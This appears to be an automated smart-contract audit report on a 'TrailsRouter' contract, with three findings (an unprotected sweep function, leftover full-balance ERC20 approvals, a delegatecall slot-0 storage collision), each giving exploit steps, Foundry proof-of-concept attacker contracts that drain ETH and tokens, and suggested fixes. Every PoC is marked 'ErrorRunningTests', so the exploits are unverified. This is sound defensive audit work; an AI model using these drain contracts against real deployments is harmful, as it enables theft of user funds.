# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern

USING MULTI_PATTERN_TO_FINDING_ANALYSIS_MODE = true; and gpt-5.1
NICHE_PATTERN_ANALYSIS_MODE = false;
Update prompt

 **Derived From** : Unrestricted injectAndCall lets anyone sweep router-held ETH and ERC20 balances

[L-1]. Public injectAndCall lets anyone drain TrailsRouter-held ETH and ERC20 balances
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Persistent ERC20 approvals in balance injection let targets drain wallet funds later

[H-2]. Persistent ERC20 approvals in TrailsRouter._injectAndExecuteCall let targets drain wallet balances without new intents
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Tstorish storage slot collision under delegatecall can break sentinel logic

[M-3]. Delegatecall storage collision in Tstorish makes validateOpHashAndSweep unusable on hosts with non‑zero slot 0
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 1
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Unrestricted injectAndCall lets anyone sweep router-held ETH and ERC20 balances

## [L-1]. Public injectAndCall lets anyone drain TrailsRouter-held ETH and ERC20 balances

### Finding Severity Justification: The described behavior allows anyone to move any ETH or ERC20 tokens that are accidentally sent to, or otherwise left on, the TrailsRouter implementation address by using the public injectAndCall function. However, by design the protocol treats the deployed Router as a stateless helper and not as a custody address; normal flows (pullAndExecute / injectSweepAndCall) operate on msg.sender funds, and user assets should reside in Sequence wallets or other contracts, not on the Router singleton. The primary impact is loss of misdirected funds due to integration mistakes or users sending assets directly to the Router, which is treated in Code4rena as a QA / Low severity issue rather than loss of core protocol assets.
## Derived From Pattern/Invariant
Unrestricted injectAndCall lets anyone sweep router-held ETH and ERC20 balances

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter.injectAndCall is intended to be used from a Sequence wallet via delegatecall, but it is declared as a public function with no access control and operates on the router contract’s own balances.

The function always reads the balance of the router implementation itself via _getSelfBalance(token) and forwards that entire balance into an arbitrary external call:

    function injectAndCall(
        address token,
        address target,
        bytes calldata callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) public payable {
        uint256 callerBalance = _getSelfBalance(token);
        if (callerBalance == 0) {
            if (token == address(0)) {
                revert NoEthAvailable();
            } else {
                revert NoTokensToSweep();
            }
        }

        _injectAndExecuteCall(token, target, callData, amountOffset, placeholder, callerBalance);
    }

_injectAndExecuteCall then blindly spends that balance:

- For native ETH (token == address(0)):

        (bool success, bytes memory result) = target.call{value: callerBalance}(callData);

  This sends all ETH held by the TrailsRouter implementation to target.

- For ERC20 tokens:

        IERC20 erc20 = IERC20(token);
        SafeERC20.forceApprove(erc20, target, callerBalance);
        (bool success, bytes memory result) = target.call(callData);

  This gives target an allowance equal to the router’s full token balance, allowing target to transferFrom the router to any address.

Unlike sweep, refundAndSweep and validateOpHashAndSweep, injectAndCall is not protected by the onlyDelegatecall modifier and performs no authentication. Any EOA can call it directly on the deployed TrailsRouter singleton and cause all ETH or ERC20 tokens held at that address (whether from legitimate standalone flows, integration mistakes, or accidental transfers) to be forwarded to an attacker-controlled target.

This effectively makes TrailsRouter a publicly sweepable hot wallet: any value that accumulates on the router implementation address can be drained by the first attacker to invoke injectAndCall.

## Impact
Any ETH or ERC20 tokens that end up held by the TrailsRouter implementation address (e.g. via standalone pullAndExecute/injectSweepAndCall flows, misrouted transfers, or leftover balances) can be fully stolen by an arbitrary EOA. The attacker can drain the router’s entire balance of a given asset in a single transaction, leading to direct loss of user or integrator funds that were not meant to be publicly sweepable.

## Command to Run Test


## Proof of Concept
1. A victim or integrator sends ETH or ERC20 tokens to the deployed TrailsRouter singleton address. This can happen via the receive() function for native ETH (e.g. address(router).call{value: X}("") ) or via an ERC20.transfer to the router.
2. The router now holds a positive ETH or token balance at its own address.
3. For ERC20, the attacker deploys a helper contract whose function drain(address token, address to) reads IERC20(token).balanceOf(msg.sender) and then calls transferFrom(msg.sender, to, balance). No helper is needed for ETH; the attacker can use their own EOA as the target.
4. The attacker, from an unprivileged EOA, calls TrailsRouter.injectAndCall(token, target, attackerCalldata, 0, 0).
5. injectAndCall computes callerBalance = _getSelfBalance(token) (the router’s full balance of that asset) and passes it to _injectAndExecuteCall, which either:
   - sends callerBalance wei to target via target.call{value: callerBalance}(callData) (ETH case), or
   - calls SafeERC20.forceApprove(token, target, callerBalance) and then invokes target, allowing it to transferFrom the router to the attacker (ERC20 case).
6. After the call, the router’s balance of that asset is 0, and the attacker now holds all previously router-held ETH/tokens.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MOCK") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract AttackerTokenTarget {
    function drain(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        IERC20(token).transferFrom(msg.sender, to, bal);
    }
}

contract InjectAndCallAuthBypassTest is Test {
    TrailsRouter router;
    MockToken token;
    address victim = address(0xBEEF);
    address attacker = address(0xBADD);
    AttackerTokenTarget attackerTarget;

    function setUp() public {
        router = new TrailsRouter();
        token = new MockToken();
        attackerTarget = new AttackerTokenTarget();
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 1 ether);
    }

    function test_stealEthViaInjectAndCall() public {
        // Victim mistakenly sends ETH to router
        vm.prank(victim);
        (bool ok,) = address(router).call{value: 10 ether}("");
        require(ok, "send failed");

        uint256 attackerBefore = attacker.balance;

        // Attacker sweeps router ETH via injectAndCall
        vm.prank(attacker);
        router.injectAndCall(
            address(0),
            attacker,
            "",
            0,
            bytes32(0)
        );

        assertEq(address(router).balance, 0);
        assertGt(attacker.balance, attackerBefore);
        assertEq(attacker.balance - attackerBefore, 10 ether);
    }

    function test_stealERC20ViaInjectAndCall() public {
        // Victim accidentally transfers tokens to router
        token.mint(victim, 1_000 ether);
        vm.prank(victim);
        token.transfer(address(router), 1_000 ether);

        uint256 attackerBefore = token.balanceOf(attacker);

        // Attacker drains all router tokens using attackerTarget
        vm.prank(attacker);
        router.injectAndCall(
            address(token),
            address(attackerTarget),
            abi.encodeWithSelector(AttackerTokenTarget.drain.selector, address(token), attacker),
            0,
            bytes32(0)
        );

        assertEq(token.balanceOf(address(router)), 0);
        assertGt(token.balanceOf(attacker), attackerBefore);
        assertEq(token.balanceOf(attacker) - attackerBefore, 1_000 ether);
    }
}


## Suggested Mitigation
Add delegatecall-only access control to injectAndCall so it cannot be invoked directly on the TrailsRouter implementation and always operates in the wallet context when used via the Shim. For example:

    function injectAndCall(
        address token,
        address target,
        bytes calldata callData,
        uint256 amountOffset,
        bytes32 placeholder
    ) external payable onlyDelegatecall {
        _injectAndCallDelegated(token, target, callData, amountOffset, placeholder);
    }

For non-delegatecall / standalone usage, keep injectSweepAndCall as the public entrypoint that pulls balances from msg.sender (using msg.value and transferFrom(msg.sender, ...)) instead of using _getSelfBalance(token). Alternatively, split the logic so the public function never forwards or approves the contract’s own balance without an explicit privileged role and operates only on caller-supplied funds.





 **Derived From** : Persistent ERC20 approvals in balance injection let targets drain wallet funds later

## [H-2]. Persistent ERC20 approvals in TrailsRouter._injectAndExecuteCall let targets drain wallet balances without new intents

### Finding Severity Justification: The report correctly identifies that _injectAndExecuteCall unconditionally grants an allowance equal to the wallet’s entire ERC20 balance to an arbitrary target and never revokes it. In the intended delegatecall context (Sequence wallet), this is effectively the wallet approving an untrusted target for its full token balance. After the single intended call completes, the allowance remains, and the target (or anyone who can trigger it) can later call transferFrom to drain all tokens covered by the allowance without any new user signature or new Trails intent. This is a direct theft path for arbitrary ERC20 balances from user wallets, fully bypassing the Merkle-tree / intent-scoping model. There is no whitelist or other mitigation on `target`. This is therefore a loss-of-assets bug with a realistic, straightforward attack path, warranting High severity.
## Derived From Pattern/Invariant
Persistent ERC20 approvals in balance injection let targets drain wallet funds later

## Exploit Type
AuthByPass

## Location
TrailsRouter._injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The balance injection helper in TrailsRouter grants ERC20 spending rights to an arbitrary target contract and never revokes them, effectively bypassing Trails’ intent-scoped authorization model.

In the ERC20 branch of _injectAndExecuteCall, the router approves the full "callerBalance" to the target before making the external call:

    function _injectAndExecuteCall(
        address token,
        address target,
        bytes memory callData,
        uint256 amountOffset,
        bytes32 placeholder,
        uint256 callerBalance
    ) internal {
        ...
        if (token == address(0)) {
            (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
            emit BalanceInjectorCall(...);
            if (!success) revert TargetCallFailed(result);
        } else {
            IERC20 erc20 = IERC20(token);
            SafeERC20.forceApprove(erc20, target, callerBalance);

            (bool success, bytes memory result) = target.call(callData);
            emit BalanceInjectorCall(...);
            if (!success) revert TargetCallFailed(result);
        }
    }

This helper is reachable from:
- injectSweepAndCall(): pulls the user’s entire ERC20 balance into the router, then calls _injectAndExecuteCall.
- injectAndCall() and _injectAndCallDelegated() (via handleSequenceDelegateCall): read the entire ERC20 balance of address(this) and then call _injectAndExecuteCall.

In delegatecall context (the intended Sequence wallet usage), `address(this)` inside TrailsRouter is the wallet. Thus SafeERC20.forceApprove(erc20, target, callerBalance) sets the ERC20 allowance from the wallet to the arbitrary `target` for the wallet’s full token balance at that moment. The allowance is not reset to 0 after the call returns.

This means:
- Any target contract invoked via injectAndCall / _injectAndCallDelegated gains persistent spending power over the wallet’s tokens (up to `callerBalance` at the last call).
- The target can later call token.transferFrom(wallet, ...) directly, without going back through TrailsRouter, TrailsRouterShim, or the Sequence intent flow, and without a fresh user signature.
- The router does not enforce any access control (no whitelist) on `target`, nor any revocation or time-bounding of these approvals.

This breaks the intended security invariant that all wallet token movements go through the Sequence Merkle-tree intent model. A malicious or compromised `target` contract can drain funds that the user only intended to use for a single Trails operation. Because _injectAndExecuteCall is an internal helper without additional auth, any caller of injectAndCall / injectSweepAndCall can set such approvals.


## Impact
When TrailsRouter is used in delegatecall context (via TrailsRouterShim/Sequence wallet) or directly, any call to `injectAndCall`, `_injectAndCallDelegated`, or `injectSweepAndCall` with a non‑native `token` causes `_injectAndExecuteCall` to grant `target` an ERC20 allowance equal to `callerBalance` (the entire current balance of `token` held by the calling contract or by the router in the sweep case). This approval is set with `SafeERC20.forceApprove` and is never revoked. As a result:
- Any `target` used in a single `injectAndCall`/`injectSweepAndCall` flow gains persistent `transferFrom` rights up to `callerBalance` over that contract’s tokens, even after the intended call completes.
- In the intended Sequence delegatecall setup, `address(this)` is the user’s Sequence wallet/intent contract, so the wallet effectively grants this long‑lived allowance to an arbitrary `target` chosen in that intent. The later `transferFrom` calls do not go through TrailsRouter, TrailsRouterShim, or the Merkle‑intent checks.
- In non‑delegatecall usage (`injectSweepAndCall` on the router directly), the router itself becomes the approved owner of user‑swept tokens, and the arbitrary `target` can drain those balances from the router with no further user approval.
The approved amount is limited to the current balance at the time of the injection call (not future deposits), but within that bound a malicious or subsequently compromised `target` can unilaterally transfer out all approved tokens at any later time, bypassing the intended one‑shot, intent‑scoped authorization model. This creates a direct asset‑theft path for any ERC20 tokens involved in Trails flows and for any ERC20 balances held by contracts that use TrailsRouter’s injection helpers.

## Command to Run Test


## Proof of Concept
Below is a minimal PoC aligned with the actual TrailsRouter interface and its intended delegatecall usage. It shows how a target called once via `handleSequenceDelegateCall` + `injectAndCall` can later drain the wallet’s tokens using the persistent allowance.

1. Contracts
- `TestToken` – simple mintable ERC20.
- `MaliciousTarget` – has:
  * `doNothing()` – empty function that will be called during Trails flow.
  * `drain(address token, address victim)` – reads `allowance(victim, address(this))` and moves that amount from `victim` to the caller via `transferFrom`.
- `WalletLike` – simulates a Sequence wallet that delegatecalls into TrailsRouter through the delegated extension entry point:
  * Exposes `execInjectAndCall(address router, address token, address target)` which builds the encoded payload for `TrailsRouter.injectAndCall(token, target, callData, 0, 0)` and then delegatecalls `handleSequenceDelegateCall` on the router, exactly like the Sequence kernel would.

2. Setup
- Deploy `TrailsRouter`.
- Deploy `TestToken`, `MaliciousTarget`, and `WalletLike`.
- Mint 1,000 tokens to `WalletLike` so that `address(wallet)` holds the tokens (this simulates the Sequence wallet/intent contract holding assets).

3. Legitimate balance‑injection call
- The wallet owner calls `wallet.execInjectAndCall(address(router), address(token), address(target))`.
- Inside `execInjectAndCall`, the wallet delegatecalls into `router.handleSequenceDelegateCall(...)` with encoded data for `injectAndCall(token, target, abi.encodeWithSelector(MaliciousTarget.doNothing.selector), 0, bytes32(0))`.
- In delegatecall context, within `TrailsRouter`:
  * `_getSelfBalance(token)` returns the wallet’s current token balance (1,000).
  * `_injectAndExecuteCall` is called with `callerBalance = 1_000`.
  * Because `token != address(0)`, it executes `SafeERC20.forceApprove(erc20, target, callerBalance)` from the wallet’s context, setting `allowance(wallet, target) = 1_000`.
  * It then calls `target.doNothing()`, which does nothing and returns.
- The wallet still has 1,000 tokens after this call; only an allowance has been created.

4. Exploit
- At any later block, without any new intent or signature, an attacker calls `MaliciousTarget.drain(address(token), address(wallet))`.
- Inside `drain`:
  * `allowance = token.allowance(wallet, address(this))` is 1,000 (set in step 3).
  * It calls `token.transferFrom(wallet, msg.sender, allowance)`.
- The transfer succeeds because the router granted this persistent approval in step 3.

5. Result
- The attacker fully drains the 1,000 tokens from `wallet` without going through TrailsRouter again and without any new user authorization.
- All security expectations that token movement must go through the Merkle‑tree intent mechanism are bypassed for these tokens, solely due to the leftover approval.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {ITrailsRouter} from "src/interfaces/ITrailsRouter.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract TestToken is ERC20 {
    constructor() ERC20("TestToken", "TT") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MaliciousTarget {
    function doNothing() external {}

    function drain(address token, address victim) external {
        IERC20 erc20 = IERC20(token);
        uint256 allowance = erc20.allowance(victim, address(this));
        erc20.transferFrom(victim, msg.sender, allowance);
    }
}

/// @dev Simulates a Sequence wallet that delegatecalls the TrailsRouter
contract WalletLike {
    function execInjectAndCall(address router, address token, address target) external {
        // Build calldata for TrailsRouter.injectAndCall(address,address,bytes,uint256,bytes32)
        bytes memory innerCallData = abi.encodeWithSelector(
            MaliciousTarget.doNothing.selector
        );
        bytes memory injectAndCallData = abi.encodeWithSelector(
            ITrailsRouter.injectAndCall.selector,
            token,
            target,
            innerCallData,
            uint256(0),
            bytes32(0)
        );

        // Now wrap that as if the Sequence kernel were calling handleSequenceDelegateCall
        bytes memory handleData = abi.encodeWithSelector(
            ITrailsRouter.handleSequenceDelegateCall.selector,
            bytes32(0), // _opHash (unused by router in this branch)
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            injectAndCallData
        );

        (bool success, bytes memory ret) = router.delegatecall(handleData);
        if (!success) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }
}

contract PersistentApprovalTest is Test {
    TrailsRouter router;
    TestToken token;
    WalletLike wallet;
    MaliciousTarget target;
    address attacker = address(0xBEEF);

    function setUp() public {
        router = new TrailsRouter();
        token = new TestToken();
        wallet = new WalletLike();
        target = new MaliciousTarget();

        // Fund the wallet (simulating the Sequence intent contract holding funds)
        token.mint(address(wallet), 1_000 ether);
    }

    function testPersistentApprovalAllowsDrain() public {
        // Sanity: wallet has the funds, router has none
        assertEq(token.balanceOf(address(wallet)), 1_000 ether);
        assertEq(token.balanceOf(address(router)), 0);

        // Initial Trails balance injection call from the wallet via delegatecall entry point
        wallet.execInjectAndCall(address(router), address(token), address(target));

        // Wallet still holds full balance after the initial call
        assertEq(token.balanceOf(address(wallet)), 1_000 ether, "wallet should still hold full balance");

        // Allowance from wallet to target has been set by TrailsRouter._injectAndExecuteCall
        uint256 allowance = token.allowance(address(wallet), address(target));
        assertEq(allowance, 1_000 ether, "target should have persistent allowance over wallet balance");

        // Now the attacker exploits the persistent approval to drain funds
        vm.prank(attacker);
        target.drain(address(token), address(wallet));

        // All tokens are stolen from the wallet with no new user signature
        assertEq(token.balanceOf(attacker), 1_000 ether, "attacker should steal full wallet balance");
        assertEq(token.balanceOf(address(wallet)), 0, "wallet should be drained");
    }
}


## Suggested Mitigation
Update `_injectAndExecuteCall` so that any ERC20 allowance set for a `target` is:
- strictly limited to the amount needed for that single call (preferably an explicit `amount` parameter instead of `callerBalance` when possible), and
- revoked immediately after the external call returns (both on success and, if desired, best‑effort on failure paths).

A minimal, backwards‑compatible change is:

- In the ERC20 branch of `_injectAndExecuteCall`, after the external `target.call(callData)` completes (regardless of success), reset the approval back to 0:

```solidity
if (token == address(0)) {
    (bool success, bytes memory result) = target.call{value: callerBalance}(callData);
    emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);
    if (!success) revert TargetCallFailed(result);
} else {
    IERC20 erc20 = IERC20(token);

    // Grant approval only for this call
    SafeERC20.forceApprove(erc20, target, callerBalance);

    (bool success, bytes memory result) = target.call(callData);
    emit BalanceInjectorCall(token, target, placeholder, callerBalance, amountOffset, success, result);

    // Revoke approval to prevent future unauthorized pulls
    // Use safeApprove(0) or forceApprove(0) depending on OZ version and token semantics
    SafeERC20.safeApprove(erc20, target, 0);

    if (!success) revert TargetCallFailed(result);
}
```

Further hardening:
- Where the downstream protocol requires less than the entire balance, pass an explicit `amount` into `_injectAndExecuteCall` and approve only that amount instead of `callerBalance`.
- If certain trusted contracts genuinely need persistent allowances for gas optimization, gate that behavior behind a configurable allowlist or a dedicated function, keeping the default injection path strictly one‑shot with revocation.

These changes preserve existing functionality while ensuring that a `target` cannot retain ERC20 spending power beyond the single orchestrated call that the user’s intent authorized.





 **Derived From** : Tstorish storage slot collision under delegatecall can break sentinel logic

## [M-3]. Delegatecall storage collision in Tstorish makes validateOpHashAndSweep unusable on hosts with non‑zero slot 0

### Finding Severity Justification: The report correctly shows that when TrailsRouter is used via delegatecall (the intended mode), the Tstorish storage flag _tstoreSupport lives in slot 0 of the host wallet’s storage, not in isolated router storage. On chains where TSTORE/TLOAD are not yet supported, the constructor will have wired _getTstorish to _getTstorishWithSloadFallback, which branches on _tstoreSupport. If the host wallet has any non-zero value at slot 0, the router will incorrectly treat _tstoreSupport as true and attempt to use tload, which will revert as an invalid opcode. This makes validateOpHashAndSweep (and any other future _getTstorish usages) unusable under delegatecall for such wallets, effectively disabling the success-sentinel-gated sweep path. The impact is a functional DoS of a core fee/refund invariant flow, potentially leaving funds in the wallet that cannot be swept using the intended validated path, and breaking protocol assumptions about conditional fee collection. It does not directly enable theft, but it can block correct operation for a large class of hosts, so Medium is appropriate: protocol function and availability are significantly impacted without direct loss of user assets.
## Derived From Pattern/Invariant
Tstorish storage slot collision under delegatecall can break sentinel logic

## Exploit Type
StorageLayout

## Location
TrailsRouter.validateOpHashAndSweep

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter inherits the Tstorish helper, which introduces a normal storage boolean `_tstoreSupport` at storage slot 0 and uses it inside the fallback getter `_getTstorishWithSloadFallback` to decide whether to use transient storage opcodes (`tstore/tload`) or regular storage (`sstore/sload`):

Vulnerable logic:
- In `Tstorish.sol`:
  `bool private _tstoreSupport;`

  `function _getTstorishWithSloadFallback(uint256 storageSlot) private view returns (uint256 value) {`
  `    if (_tstoreSupport) {`
  `        assembly { value := tload(storageSlot) }`
  `    } else {`
  `        assembly { value := sload(storageSlot) }`
  `    }`
  `}`

- In `TrailsRouter.validateOpHashAndSweep`:
  `uint256 slot = TrailsSentinelLib.successSlot(opHash);`
  `if (_getTstorish(slot) != TrailsSentinelLib.SUCCESS_VALUE) {`
  `    revert SuccessSentinelNotSet();`
  `}`

Tstorish sets the internal function pointer `_getTstorish` to `_getTstorishWithSloadFallback` when the chain **does not support** `TSTORE/TLOAD` at deployment (current L1/L2s). The idea is that `_tstoreSupport` remains `false` and the fallback always uses `sload` until `__activateTstore` is called.

However, TrailsRouter is intended to be used **via `delegatecall`** from a Sequence v3 wallet (or other smart accounts). Under `delegatecall`, the code of TrailsRouter executes in the **storage context of the caller**, so `_tstoreSupport` no longer refers to TrailsRouter's own storage slot 0 but to whatever the host wallet has stored in slot 0 (e.g., owner/config/any other value). The host contract is never told to keep slot 0 at zero.

On chains where `TSTORE/TLOAD` are **not supported**, this creates the following storage‑collision failure:
- If the host wallet has any **non‑zero** value in its storage slot 0 (very common for real contracts), then `_tstoreSupport` is seen as `true` inside `_getTstorishWithSloadFallback` when executed via `delegatecall`.
- The fallback then executes `tload(storageSlot)` even though the EVM does not support the opcode yet, causing an invalid opcode revert.
- As a result, any call to `_getTstorish(slot)` from TrailsRouter under `delegatecall` will revert, even if the sentinel at `slot` was correctly written using `sstore`.

Because `validateOpHashAndSweep` unconditionally calls `_getTstorish` before sweeping, this storage collision means that for any host wallet whose storage slot 0 is non‑zero, **all calls to `validateOpHashAndSweep` will revert**, permanently bricking the success‑sentinel‑gated sweep path for that wallet.

This is a classic storage‑collision bug: a delegated extension defines a plain storage variable at slot 0 (`_tstoreSupport`) and uses it inside low‑level helpers, but when executed via `delegatecall` its layout aliases arbitrary state in the calling wallet. The branch intended to be controlled only by `__activateTstore` is instead controlled by the host wallet's unrelated slot 0, causing the router to attempt `tload` on chains that don't support it.

The impact is that any Trails integration that executes `validateOpHashAndSweep` via `delegatecall` from a wallet with non‑zero storage at slot 0 will see that path **always revert**, making the success sentinel unusable and breaking fee‑collection / sweep flows that rely on it.

## Impact
Functional DoS of the success-sentinel validation and associated sweep path for any host wallet whose storage slot 0 is non-zero, on chains where TSTORE/TLOAD are not yet supported. This can permanently break Trails flows that rely on validateOpHashAndSweep for fee collection or conditional sweeping, potentially leaving bridged funds or fees stuck in the intent wallet until the user manually recovers them via alternative flows.

## Command to Run Test


## Proof of Concept
1. Assume the chain does **not** support EIP-1153 `TSTORE/TLOAD` (current mainnet/L2 behavior). In this environment, Tstorish's constructor sets `_tstoreInitialSupport = false` and binds `_getTstorish` to `_getTstorishWithSloadFallback`.
2. An attacker (or simply a user) deploys a wallet contract that will act as the `delegatecall` host for TrailsRouter. This wallet:
   - Stores a non-zero value in **storage slot 0** (e.g., `uint256 public slot0Value = 1;`).
   - Holds a reference to the deployed TrailsRouter.
3. The attacker (or user) computes an `opHash` and pre-sets the Trails sentinel slot directly in the wallet's storage using `sstore(successSlot(opHash), SUCCESS_VALUE)`. This mimics the normal case where the shim would correctly mark the operation as successful.
4. The wallet then makes a `delegatecall` into TrailsRouter with calldata for `validateOpHashAndSweep(opHash, token, recipient)`.
5. Inside `validateOpHashAndSweep`, the router calculates `slot = TrailsSentinelLib.successSlot(opHash)` and calls `_getTstorish(slot)`.
6. Because the router is executing under `delegatecall`, `_tstoreSupport` is read from the **wallet's** storage slot 0. Since `slot0Value` is 1, `_tstoreSupport` evaluates to `true`, even though `__activateTstore` was never called.
7. `_getTstorishWithSloadFallback` takes the true branch and executes `tload(slot)`. On this chain, `tload` is not a valid opcode, so the call reverts with an invalid opcode.
8. The revert bubbles up and causes `validateOpHashAndSweep` to revert, **despite** the sentinel being correctly set to `SUCCESS_VALUE`. The intended success-gated sweep can never run for this wallet.
9. Any integration that uses such a wallet (or any real wallet whose slot 0 is non-zero) will find that `validateOpHashAndSweep` is permanently unusable and that any Trails flows depending on it will fail, effectively causing a persistent DoS of fee-sweep logic.

## Proof of Code
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {TrailsRouter} from "src/TrailsRouter.sol";
import {TrailsSentinelLib} from "src/libraries/TrailsSentinelLib.sol";

// Simple wallet that will host TrailsRouter via delegatecall.
// It deliberately has non-zero data in storage slot 0 to trigger the collision.
contract TestWallet {
    // This occupies storage slot 0 and is non-zero.
    uint256 public slot0Value = 1;

    // Next variable goes to slot 1.
    TrailsRouter public router;

    constructor(TrailsRouter _router) {
        router = _router;
    }

    // Directly write to an arbitrary storage slot in this wallet.
    function setSentinel(uint256 slot, uint256 value) external {
        assembly {
            sstore(slot, value)
        }
    }

    // Delegatecall into TrailsRouter.validateOpHashAndSweep.
    function callValidate(bytes32 opHash, address token, address recipient) external {
        bytes memory data = abi.encodeWithSelector(
            router.validateOpHashAndSweep.selector,
            opHash,
            token,
            recipient
        );

        // We don't check the return value; any revert in the router will bubble up.
        address(router).delegatecall(data);
    }
}

contract TstorishCollisionTest is Test {
    function test_TstorishCollision_RevertsValidateOpHashAndSweep() public {
        // Deploy the TrailsRouter singleton.
        TrailsRouter router = new TrailsRouter();

        // Deploy a wallet that has non-zero data in storage slot 0.
        TestWallet wallet = new TestWallet(router);

        // Compute an opHash and the corresponding sentinel slot.
        bytes32 opHash = keccak256("op-hash-for-test");
        uint256 slot = TrailsSentinelLib.successSlot(opHash);

        // Manually set the sentinel to SUCCESS_VALUE in the wallet's storage,
        // simulating a prior successful shim call.
        wallet.setSentinel(slot, TrailsSentinelLib.SUCCESS_VALUE);

        // In a correct implementation (using sload), this would pass the sentinel
        // check and sweep, and because the wallet holds no funds it would simply
        // no-op and NOT revert.
        //
        // Due to the storage collision on _tstoreSupport, Tstorish will instead
        // take the TLOAD branch on a chain that does not support TSTORE/TLOAD,
        // causing an invalid-opcode revert.
        vm.expectRevert();
        wallet.callValidate(opHash, address(0), address(0xdead));
    }
}


## Suggested Mitigation
Do not rely on a plain storage boolean at slot 0 inside a delegatecall extension to gate between TSTORE/TLOAD and SSTORE/SLOAD. Concretely:

1. **Remove the per-instance `_tstoreSupport` storage flag** for contracts that are intended to be used via `delegatecall` (like TrailsRouter and TrailsRouterShim). For these contracts, either:
   - Hard-disable TSTORE/TLOAD and always use `sstore/sload` (simplest and safest), or
   - Use only the immutable `_tstoreInitialSupport` computed at deployment and never branch on a mutable storage flag.

2. If you still want runtime activation of TSTORE, store the activation flag in a **namespaced slot** under your own control instead of using Solidity's default slot 0. For example:
   - Define a constant `bytes32 private constant TSTORISH_SLOT = keccak256("org.sequence.tstorish.support");`
   - Read/write the flag via inline assembly `sload(TSTORISH_SLOT)` / `sstore(TSTORISH_SLOT, 1)`.
   - Ensure both writer (`__activateTstore`) and readers (`_getTstorishWithSloadFallback`, `_setTstorishWithSstoreFallback`) use this namespaced slot.

3. Alternatively, move the sentinel storage helpers out of Tstorish entirely for Trails and implement a minimal, explicit helper that always uses `sstore/sload` against the wallet's sentinel slot. This eliminates both the storage-collision risk and any future semantic changes from transient storage opcodes.

Any of these changes avoid aliasing `_tstoreSupport` with the host wallet's slot 0 and ensure that `validateOpHashAndSweep` does not accidentally execute `tload` on chains where it is unsupported.



